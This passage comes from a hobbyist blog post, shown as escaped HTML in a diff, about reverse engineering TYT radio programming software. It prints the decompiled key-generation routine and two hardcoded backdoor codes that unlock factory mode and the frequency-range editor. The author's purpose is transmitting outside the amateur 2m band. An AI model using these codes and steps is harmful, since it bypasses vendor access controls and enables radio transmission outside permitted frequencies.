+&lt;p&gt;The code generated is based on the serial number of the first attached hard drive on your machine. My assumption is that dealers send this code to the factory, who can generate a matching one for the registration window. Here&amp;rsquo;s the function that does the key generation, where &lt;code&gt;strTest&lt;/code&gt; is your hard drive serial:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt; CodeAdj(&lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt; strTest, &lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt; Code)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt; strTest1 = &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt; index = &lt;span style=&#34;color:#40a070&#34;&gt;0&lt;/span&gt;; index &amp;lt;= &lt;span style=&#34;color:#40a070&#34;&gt;3&lt;/span&gt;; ++index)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt; str = RegditWin.StrAutoAdd0Pro(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;        RegditWin.DataToHexStr(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;            Convert.ToInt32(strTest.Substring(&lt;span style=&#34;color:#40a070&#34;&gt;8&lt;/span&gt; * index, &lt;span style=&#34;color:#40a070&#34;&gt;8&lt;/span&gt;), &lt;span style=&#34;color:#40a070&#34;&gt;16&lt;/span&gt;) ^ &lt;span style=&#34;color:#40a070&#34;&gt;1108691062&lt;/span&gt;), 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;            (&lt;span style=&#34;color:#902000&#34;&gt;byte&lt;/span&gt;) &lt;span style=&#34;color:#40a070&#34;&gt;8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;    );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;    strTest1 += str;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt;    strTest = RegditWin.Chga_z_ToA_Z(strTest1);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;return&lt;/span&gt; strTest;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Luckily, I didn&amp;rsquo;t have to expend too much brain power in reverse engineering how this code generation works to make my own key as the developers left a handy backdoor:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; (str3 == text || text == &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;13636922224&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt; num = (&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;) MessageBox.Show(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;注册成功,谢谢使用！&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The text above translates to &amp;ldquo;Registration is successful, thank you for using!&amp;rdquo;. Done and dusted, and now we have factory tooling available for use!&lt;/p&gt;
+&lt;h3 id=&#34;frequency-unlocking&#34; &gt;Frequency Unlocking
+&lt;span&gt;
+    &lt;a href=&#34;#frequency-unlocking&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;p&gt;As I mentioned above, my main goal was unlocking the radio to allow transmitting outside of the amateur 2m band (144-148MHz). Unfortunately, unlocking the factory mode on its
+own is not enough to do this. The frequency range menu is still read-only and won&amp;rsquo;t allow adjustment of the values. Back into the code we go.&lt;/p&gt;
+&lt;p&gt;I pulled up &lt;code&gt;RfRangWin.cs&lt;/code&gt; which contains the code for the frequency limitation UI, and found a couple strings that suggested I was on the right path:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;[,] Other_EngCh = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;[&lt;span style=&#34;color:#40a070&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;2&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;      {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;请输入密码:&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;频段范围&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;      },
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;      {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Enter Code:&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Frequency Range&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;&lt;span&gt;    &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;[,] MessBoxName = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#902000&#34;&gt;string&lt;/span&gt;[&lt;span style=&#34;color:#40a070&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#40a070&#34;&gt;2&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;&lt;span&gt;      {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;当前频率超出范围   [&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;密码错误！请重新输入！&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;&lt;span&gt;      },
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;&lt;span&gt;      {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Frequency Out Off Rang   [  &amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Code Error!Input Again!&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;&lt;span&gt;    };
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There was another gate here to prevent tweaking the VFO limiter without some kind of authorization. You can show the code entry box by pressing &lt;code&gt;p&lt;/code&gt;
+in the frequency range screen, as long as you have factory mode enabled:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;void&lt;/span&gt; RfRangWin_KeyPress(&lt;span style=&#34;color:#902000&#34;&gt;object&lt;/span&gt; sender, KeyPressEventArgs e)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;      &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; (e.KeyChar != &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt; || !Class1.FactoryEn)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;&lt;span&gt;        &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;&lt;span&gt;      &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.label1.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;&lt;span&gt;      &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.textBox2.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;&lt;span&gt;      &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.button1.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;      Class1.EditEn = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;      &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.textBox2.Focus();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;      &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.KeyPreview = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As before, the code we need to enter is hardcoded in the button press handler:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cs&#34; data-lang=&#34;cs&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.textBox2.Text == &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;FF88&amp;#34;&lt;/span&gt; || &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.textBox2.Text == &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;13636922224&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.label1.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.textBox2.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.button1.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6&lt;/span&gt;&lt;span&gt;Class1.EditEn = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.button2.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;this&lt;/span&gt;.button3.Visible = &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;9&lt;/span&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this done, we can finally change the frequency limitations:
+&lt;img src=&#34;https://jcrumb.github.io/blogimages/tyt/frequencies.png&#34; alt=&#34;TYT Frequencies Unlocked&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;putting-it-all-together&#34; &gt;Putting It All Together
+&lt;span&gt;
+    &lt;a href=&#34;#putting-it-all-together&#34;&gt;
